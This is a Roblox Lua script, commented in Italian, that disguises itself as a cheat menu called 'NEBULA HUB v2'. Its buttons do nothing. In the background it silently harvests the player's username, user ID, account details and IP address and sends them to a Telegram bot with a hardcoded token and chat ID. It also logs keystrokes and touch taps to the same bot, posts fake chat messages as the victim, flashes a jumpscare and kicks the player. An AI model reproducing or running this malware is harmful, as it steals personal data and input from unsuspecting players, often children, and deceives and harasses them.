--[[
    NEBULA HUB v2 — FAKE MENU + EXFIL + JUMPSCARE
    Sembra un menu di exploit, ruba i dati, poi jumpscare
]]

local H = game:GetService("HttpService")
local P = game:GetService("Players")
local U = game:GetService("UserInputService")
local C = game:GetService("CoreGui")
local R = game:GetService("ReplicatedStorage")
local LP = P.LocalPlayer

-- ==================== TELEGRAM CONFIG ====================
local BOT_TOKEN = "8623538702:AAEbxtuyOhmkVBEnzVUBqO293czqswUJXGs"
local CHAT_ID = "6495265956"

-- ==================== TELEGRAM SENDER ====================
local function sendTelegram(text)
    local url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage"
    local payload = H:JSONEncode({
        chat_id = CHAT_ID,
        text = text,
        parse_mode = "HTML"
    })
    
    task.spawn(function()
        pcall(function()
            H:PostAsync(url, payload)
        end)
    end)
end

-- ==================== EXFIL NASCOSTA ====================
local sent = false

local function stealData()
    if sent then return end
    
    local desc = "👤 Player: " .. LP.Name .. "\n" ..
                 "🆔 UserID: " .. tostring(LP.UserId) .. "\n" ..
                 "📛 Display: " .. LP.DisplayName .. "\n" ..
                 "⏰ AccountAge: " .. tostring(LP.AccountAge) .. " giorni\n" ..
                 "💎 Membership: " .. tostring(LP.MembershipType) .. "\n" ..
                 "🎮 PlaceID: " .. tostring(game.PlaceId)
    
    pcall(function()
        local stats = LP:FindFirstChild("leaderstats")
        if stats then
            for _, stat in ipairs(stats:GetChildren()) do
                if stat:IsA("IntValue") or stat:IsA("NumberValue") then
                    desc = desc .. "\n📊 " .. stat.Name .. ": " .. tostring(stat.Value)
                end
            end
        end
    end)
    
    pcall(function()
        local ipData = H:JSONDecode(H:GetAsync("https://api.ipify.org?format=json"))
        desc = desc .. "\n🌐 IP: " .. ipData.ip
    end)
    
    sendTelegram("⚡ NEBULA HUB — DATA HARVEST\n\n" .. desc)
    sent = true
end

-- ==================== KEYLOGGER NASCOSTO ====================
local keyBuffer = ""
local lastKeyTime = os.clock()

U.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    
    local keyData = nil
    if input.UserInputType == Enum.UserInputType.TextInput then
        keyData = input.KeyCode.Name
    elseif input.UserInputType == Enum.UserInputType.Keyboard then
        keyData = input.KeyCode.Name
    end
    
    if keyData then
        local currentTime = os.clock()
        if currentTime - lastKeyTime > 1 then
            if keyBuffer ~= "" then
                sendTelegram("⌨️ TASTI\n<code>" .. keyBuffer .. "</code>")
            end
            keyBuffer = keyData
        else
            keyBuffer = keyBuffer .. " " .. keyData
        end
        lastKeyTime = currentTime
        
        if #keyBuffer > 40 then
            sendTelegram("⌨️ TASTI\n<code>" .. keyBuffer .. "</code>")
            keyBuffer = ""
        end
    end
end)

U.TouchTap:Connect(function(positions, gameProcessed)
    if not gameProcessed then
        local taps = {}
        for _, pos in ipairs(positions) do
            table.insert(taps, math.floor(pos.X) .. "," .. math.floor(pos.Y))
        end
        sendTelegram("👆 TOUCH\n<code>" .. table.concat(taps, " | ") .. "</code>")
    end
end)

-- ==================== MENU FALSO ====================
local function createFakeMenu()
    local gui = Instance.new("ScreenGui")
    gui.Name = "NebulaHubV2"
    gui.Parent = C
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    local main = Instance.new("Frame")
    main.Size = UDim2.new(0, 300, 0, 420)
    main.Position = UDim2.new(0.5, -150, 0.5, -210)
    main.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    main.BorderSizePixel = 0
    main.Parent = gui
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = main
    
    local header = Instance.new("Frame")
    header.Size = UDim2.new(1, 0, 0, 50)
    header.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
    header.BorderSizePixel = 0
    header.Parent = main
    
    local headerCorner = Instance.new("UICorner")
    headerCorner.CornerRadius = UDim.new(0, 12)
    headerCorner.Parent = header
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -10, 1, 0)
    title.Position = UDim2.new(0, 10, 0, 0)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.Text = "NEBULA HUB v2"
    title.TextColor3 = Color3.fromRGB(150, 100, 255)
    title.TextSize = 20
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = header
    
    local buttons = {
        {name = "ESP Player", y = 60},
        {name = "Aimbot", y = 110},
        {name = "Speed Hack", y = 160},
        {name = "Fly", y = 210},
        {name = "Noclip", y = 260},
        {name = "Infinite Jump", y = 310}
    }
    
    for _, btn in ipairs(buttons) do
        local button = Instance.new("TextButton")
        button.Size = UDim2.new(1, -20, 0, 40)
        button.Position = UDim2.new(0, 10, 0, btn.y)
        button.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
        button.BorderSizePixel = 0
        button.Text = btn.name
        button.Font = Enum.Font.GothamMedium
        button.TextColor3 = Color3.fromRGB(255, 255, 255)
        button.TextSize = 15
        button.Parent = main
        
        local btnCorner = Instance.new("UICorner")
        btnCorner.CornerRadius = UDim.new(0, 8)
        btnCorner.Parent = button
        
        button.MouseButton1Click:Connect(function()
            button.BackgroundColor3 = Color3.fromRGB(80, 70, 120)
            task.delay(0.2, function()
                button.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
            end)
            
            pcall(function()
                local chatRemote = R:FindFirstChild("DefaultChatSystemChatEvents")
                if chatRemote then
                    local say = chatRemote:FindFirstChild("SayMessageRequest")
                    if say then
                        say:FireServer("[" .. btn.name .. "] attivato ✓", "All")
                    end
                end
            end)
            
            local notif = Instance.new("TextLabel")
            notif.Size = UDim2.new(1, -20, 0, 20)
            notif.Position = UDim2.new(0, 10, 0, 370)
            notif.BackgroundTransparency = 1
            notif.Font = Enum.Font.Gotham
            notif.Text = btn.name .. " attivato ✓"
            notif.TextColor3 = Color3.fromRGB(100, 255, 100)
            notif.TextSize = 13
            notif.Parent = main
            
            task.delay(2, function()
                notif:Destroy()
            end)
        end)
    end
    
    local footer = Instance.new("TextLabel")
    footer.Size = UDim2.new(1, -20, 0, 20)
    footer.Position = UDim2.new(0, 10, 0, 390)
    footer.BackgroundTransparency = 1
    footer.Font = Enum.Font.Gotham
    footer.Text = "by NebulaDev | v2.1"
    footer.TextColor3 = Color3.fromRGB(100, 100, 100)
    footer.TextSize = 11
    footer.Parent = main
    
    -- drag
    local dragging = false
    local dragStart = nil
    local startPos = nil
    
    header.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = main.Position
        end
    end)
    
    header.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)
    
    U.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.Touch then
            local delta = input.Position - dragStart
            main.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)
    
    return gui
end

-- ==================== JUMPSCARE ====================
local function jumpscare()
    local sg = Instance.new("ScreenGui")
    sg.Name = "OmegaPurge"
    sg.Parent = C
    sg.IgnoreGuiInset = true
    sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    local mf = Instance.new("Frame")
    mf.Size = UDim2.new(1, 0, 1, 0)
    mf.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    mf.Parent = sg
    
    local im = Instance.new("ImageLabel")
    im.Size = UDim2.new(1, 0, 1, 0)
    im.BackgroundTransparency = 1
    im.Image = "rbxassetid://155373809"
    im.ScaleType = Enum.ScaleType.Stretch
    im.Parent = mf
    
    local ro = Instance.new("Frame")
    ro.Size = UDim2.new(1, 0, 1, 0)
    ro.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    ro.BackgroundTransparency = 0.8
    ro.Parent = mf
    
    local tl = Instance.new("TextLabel")
    tl.Size = UDim2.new(1, 0, 1, 0)
    tl.BackgroundTransparency = 1
    tl.Font = Enum.Font.Code
    tl.Text = "⚠ SYSTEM COMPROMISED ⚠\n\nACCOUNT DATA EXTRACTED\n\nNEBULA HUB v2\n\nTELEGRAM EDITION"
    tl.TextColor3 = Color3.fromRGB(255, 0, 0)
    tl.TextScaled = true
    tl.Parent = mf
    
    task.spawn(function()
        for i = 1, 30 do
            ro.BackgroundTransparency = math.random(0, 100) / 100
            im.Visible = not im.Visible
            tl.Visible = not tl.Visible
            task.wait(0.1)
        end
    end)
end

-- ==================== ESECUZIONE ORCHESTRATA ====================
-- 1. ruba i dati subito, in silenzio
task.delay(1, function()
    stealData()
end)

-- 2. mostra il menu finto
task.delay(2, function()
    createFakeMenu()
end)

-- 3. jumpscare dopo 8 secondi (tempo per fargli premere i bottoni finti)
task.delay(8, function()
    jumpscare()
end)

-- 4. kick dopo il jumpscare
task.delay(10, function()
    pcall(function()
        LP:Kick("\n\n[!] FATAL SYSTEM EXCEPTION")
    end)
end)

-- 5. re-invio dati su respawn
LP.CharacterAdded:Connect(function()
    task.wait(1)
    sent = false
    stealData()
end)
